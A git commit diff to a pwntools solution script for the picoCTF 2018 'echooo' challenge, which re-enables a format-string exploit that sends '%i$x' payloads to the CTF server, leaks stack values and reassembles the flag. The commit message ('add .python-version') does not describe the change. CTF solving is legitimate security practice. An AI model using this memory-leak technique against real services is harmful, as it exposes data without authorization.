0e276abebc085d6fccf9175cbd22be3db91ba149
pd-1 <pd-1@dwrm.com>
2020-01-23 08:48:54 +0000

    add .python-version

--- picoctf2018/echooo/echooo_solution.py
+++ picoctf2018/echooo/echooo_solution.py
@@ -3,30 +3,31 @@ from pwn import *
 
 s = remote('2018shell.picoctf.com', 3981)
 
-#encFlag = ''
-#stage1 = ' '.join([f'%{i}$x' for i in range(27, 37)])
-#print(s.recvuntil('>'), stage1)
-#s.sendline(stage1)
-#flag1 = s.recvuntil('\n').strip()
-#log.info('Flag Part 1: {}'.format(flag1))
-#
-#stage2 = ' '.join([f'%{i}$x' for i in range(37, 42)])
-#print('>', stage2)
-#s.sendline(stage2)
-#flag2 = s.recvuntil('\n').replace(b'>', b'').strip()
-#log.info('Flag Part 2: {}'.format(flag2))
-#
-#encFlag = flag1 + b' ' + flag2
-#log.info('encFlag is: {}'.format(encFlag))
-#flag = b''
-#for i in encFlag.split(b' '):
-#    flag += p32(int(i, 16))
-#
-#log.info('flag is: {}'.format(flag))
-#log.success('Flag: ' + re.findall(r'(picoCTF\{.+\})', str(flag))[0])
+encFlag = ''
+stage1 = ' '.join([f'%{i}$x' for i in range(27, 37)])
+print(s.recvuntil('>'), stage1)
+s.sendline(stage1)
+flag1 = s.recvuntil('\n').strip()
+log.info('Flag Part 1: {}'.format(flag1))
 
-# Print 16 DWORDs wouldn't work, why?
-# Why do we need to split them into 27-37 and then 37-42?
+stage2 = ' '.join([f'%{i}$x' for i in range(37, 42)])
+print('>', stage2)
+s.sendline(stage2)
+flag2 = s.recvuntil('\n').replace(b'>', b'').strip()
+log.info('Flag Part 2: {}'.format(flag2))
+
+encFlag = flag1 + b' ' + flag2
+log.info('encFlag is: {}'.format(encFlag))
+flag = b''
+for i in encFlag.split(b' '):
+    flag += p32(int(i, 16))
+
+log.info('flag is: {}'.format(flag))
+log.success('Flag: ' + re.findall(r'(picoCTF\{.+\})', str(flag))[0])
+
+"""
+Print 16 DWORDs wouldn't work, why?
+Why do we need to split them into 27-37 and then 37-42?
 s.recvuntil('> ')
 sent_data = ' '.join([f'%{i}$x' for i in range(27, 42)])
 s.sendline(sent_data)
@@ -38,6 +39,7 @@ for i in encFlag.split(b' '):
     flag += p32(int(i, 16))
 
 log.success('Flag: ' + re.findall(r'(picoCTF\{.+\})', str(flag))[0])
+"""
 
 # solution 2
 '''
